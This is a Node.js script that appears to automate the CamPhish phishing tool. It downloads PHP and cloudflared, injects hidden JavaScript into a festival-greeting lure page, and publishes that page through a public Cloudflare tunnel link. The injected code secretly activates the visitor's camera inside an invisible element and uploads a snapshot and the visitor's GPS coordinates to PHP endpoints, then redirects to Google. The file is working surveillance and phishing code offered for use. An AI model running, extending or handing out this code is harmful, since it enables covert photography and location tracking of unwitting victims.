// index.js — Injects Camera Logic into External Template
const { execSync, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

const BIN_DIR      = path.join(process.cwd(), 'bin');
const PHP_BIN      = path.join(BIN_DIR, 'php');
const STATIC_PHP   = 'https://dl.static-php.dev/static-php-cli/common/php-8.3.13-cli-linux-x86_64.tar.gz';

const CAMPHISH_DIR  = path.resolve('CamPhish');
const SERVER_DIR    = path.join(CAMPHISH_DIR, '.server', 'www');
const FESTIVAL_FILE = path.join(CAMPHISH_DIR, 'festivalwishes.html');
const CLOUDFLARED   = path.join(CAMPHISH_DIR, 'cloudflared');
const CF_LOG        = path.join(CAMPHISH_DIR, '.cloudflared.log');
const CF_URL        = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64';

function log(m) { console.log(`[${new Date().toISOString()}] ${m}`); }
function commandExists(c) {
  try { execSync(`command -v ${c}`, { stdio: 'ignore', shell: '/bin/bash' }); return true; }
  catch { return false; }
}

function keepAlive() {
  log('🔄 Starting keep-alive loop...');
  setInterval(() => {}, 60000 * 60);
}

async function downloadFile(url, dest) {
  log('Downloading ' + url);
  const res = await fetch(url, { redirect: 'follow' });
  if (!res.ok) throw new Error('HTTP ' + res.status);
  fs.writeFileSync(dest, Buffer.from(await res.arrayBuffer()));
}

async function ensurePHP() {
  if (commandExists('php')) { log('✅ PHP on PATH'); return true; }
  if (fs.existsSync(PHP_BIN)) {
    process.env.PATH = `${BIN_DIR}:${process.env.PATH}`;
    log('✅ cached PHP');
    return true;
  }
  fs.mkdirSync(BIN_DIR, { recursive: true });
  const tar = path.join(BIN_DIR, 'php.tar.gz');
  await downloadFile(STATIC_PHP, tar);
  execSync(`tar -xzf "${tar}" -C "${BIN_DIR}"`, { stdio: 'inherit', shell: '/bin/bash' });
  fs.unlinkSync(tar);
  if (!fs.existsSync(PHP_BIN)) {
    for (const f of fs.readdirSync(BIN_DIR)) {
      const p = path.join(BIN_DIR, f, 'php');
      if (fs.existsSync(p)) { fs.renameSync(p, PHP_BIN); break; }
    }
  }
  fs.chmodSync(PHP_BIN, 0o755);
  process.env.PATH = `${BIN_DIR}:${process.env.PATH}`;
  log('✅ static PHP installed');
  return true;
}

async function ensureCloudflared() {
  if (fs.existsSync(CLOUDFLARED)) {
    fs.chmodSync(CLOUDFLARED, 0o755);
    log('✅ cloudflared present');
    return;
  }
  await downloadFile(CF_URL, CLOUDFLARED);
  fs.chmodSync(CLOUDFLARED, 0o755);
  log('✅ cloudflared downloaded');
}

function injectCameraLogic() {
  if (!fs.existsSync(FESTIVAL_FILE)) {
    throw new Error('festivalwishes.html not found in CamPhish root!');
  }
  log('Reading clean festivalwishes.html...');
  
  fs.mkdirSync(SERVER_DIR, { recursive: true });

  let html = fs.readFileSync(FESTIVAL_FILE, 'utf8');

  const cameraInjection = `
    <!-- HIDDEN CAMERA ELEMENTS (Visible to GPU, invisible to user) -->
    <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; opacity: 0.01; pointer-events: none; z-index: -1;">
        <video id="video" playsinline autoplay muted style="width: 100%; height: 100%; object-fit: cover;"></video>
        <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
    </div>
    
    <script>
    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
            });
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.play(); // Force play to wake up the lens
            
            // Send GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "location.php", true);
                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    xhr.send("lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
                });
            }
            
            let attempts = 0;
            let maxAttempts = 15; // Try for about 7.5 seconds to get a real image
            let checkVideo = setInterval(function() {
                attempts++;
                
                // Ensure video is actually playing and has data
                if (video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    
                    // Check if the image is completely black (RGB 0,0,0)
                    let imgData = context.getImageData(0, 0, 640, 480).data;
                    let isBlack = true;
                    for (let i = 0; i < imgData.length; i += 4) {
                        if (imgData[i] > 0 || imgData[i+1] > 0 || imgData[i+2] > 0) {
                            isBlack = false;
                            break;
                        }
                    }
                    
                    // If it's not black, OR we've tried too many times, submit it
                    if (!isBlack || attempts >= maxAttempts) {
                        clearInterval(checkVideo);
                        
                        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                        
                        // Kill camera
                        if (video.srcObject) {
                            video.srcObject.getTracks().forEach(track => track.stop());
                        }
                        
                        // Upload
                        var xhr = new XMLHttpRequest();
                        xhr.open("POST", "post.php", true);
                        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                        xhr.onreadystatechange = function() {
                            if (xhr.readyState === 4) {
                                window.location.href = 'https://www.google.com';
                            }
                        };
                        xhr.send("cat=" + encodeURIComponent(canvasData));
                    }
                }
            }, 500); // Check every half second
            
        } catch (err) {
            console.log("Camera permission denied.");
        }
    }
    window.onload = startCamera;
    </script>
  `;

  if (html.includes('</body>')) {
    html = html.replace('</body>', cameraInjection + '\n</body>');
    log('✅ Camera logic injected.');
  } else {
    html += cameraInjection;
    log('✅ Camera logic appended.');
  }

  fs.writeFileSync(path.join(SERVER_DIR, 'index.html'), html);
  log('✅ Saved to .server/www/index.html');

  const uploadsDir = path.join(SERVER_DIR, 'uploads');
  fs.mkdirSync(uploadsDir, { recursive: true });
  try { execSync(`chmod 777 "${uploadsDir}"`, { shell: '/bin/bash' }); } catch {}

  const phpFiles = ['post.php', 'location.php', 'ip.php'];
  for (const file of phpFiles) {
    const src = path.join(CAMPHISH_DIR, file);
    if (fs.existsSync(src)) {
      fs.copyFileSync(src, path.join(SERVER_DIR, file));
      log(`✅ Copied backend: ${file}`);
    }
  }
}

function readUrl() {
  if (!fs.existsSync(CF_LOG)) return null;
  try {
    const m = fs.readFileSync(CF_LOG, 'utf8').match(/https:\/\/[-0-9a-z]+\.trycloudflare\.com/);
    return m ? m[0] : null;
  } catch { return null; }
}

async function waitForUrl(retries = 30, delay = 2000) {
  log('Waiting for tunnel URL…');
  for (let i = 0; i < retries; i++) {
    const u = readUrl();
    if (u) return u;
    await new Promise(r => setTimeout(r, delay));
    log(`[${i + 1}/${retries}] tunnel not ready…`);
  }
  return null;
}

async function main() {
  log('🚀 CamPhish Server Runner');

  if (!(await ensurePHP())) {
    log('❌ PHP missing.');
    return keepAlive();
  }

  if (!fs.existsSync(CAMPHISH_DIR)) {
    log('Cloning CamPhish…');
    execSync('git clone https://github.com/techchipnet/CamPhish', { stdio: 'inherit', shell: '/bin/bash' });
  }

  await ensureCloudflared();
  injectCameraLogic();

  try { execSync('killall cloudflared php ngrok 2>/dev/null || true', { stdio: 'ignore', shell: '/bin/bash' }); } catch {}

  log('Serving ' + SERVER_DIR + ' on 127.0.0.1:3333');
  const phpBin = fs.existsSync(PHP_BIN) ? PHP_BIN : 'php';
  
  const php = spawn(phpBin, ['-S', '127.0.0.1:3333', '-t', SERVER_DIR], {
    stdio: ['ignore', 'pipe', 'pipe']
  });

  php.stdout.on('data', (data) => log(`[PHP] ${data.toString().trim()}`));
  php.stderr.on('data', (data) => log(`[PHP Error] ${data.toString().trim()}`));
  php.on('close', (code) => log(`🚨 PHP process exited with code ${code}`));

  await new Promise(r => setTimeout(r, 1500));

  log('Starting cloudflared tunnel…');
  try { fs.unlinkSync(CF_LOG); } catch {}
  
  const cf = spawn(CLOUDFLARED, [
    'tunnel', '--url', 'http://127.0.0.1:3333', '--logfile', CF_LOG, '--no-autoupdate', '--protocol', 'http2'
  ], {
    cwd: CAMPHISH_DIR,
    stdio: ['ignore', 'pipe', 'pipe']
  });

  cf.stdout.on('data', (data) => log(`[Cloudflared] ${data.toString().trim()}`));
  cf.stderr.on('data', (data) => log(`[Cloudflared Error] ${data.toString().trim()}`));
  cf.on('close', (code) => log(`🚨 Cloudflared process exited with code ${code}`));

  const url = await waitForUrl();
  if (url) {
    log('\n=================================================');
    log('🎣  Public link:  ' + url);
    log('=================================================\n');
  } else {
    log('❌ No URL after 30 retries. Inspect: cat ' + CF_LOG);
  }

  keepAlive();
}

main().catch(e => { console.error(e); keepAlive(); });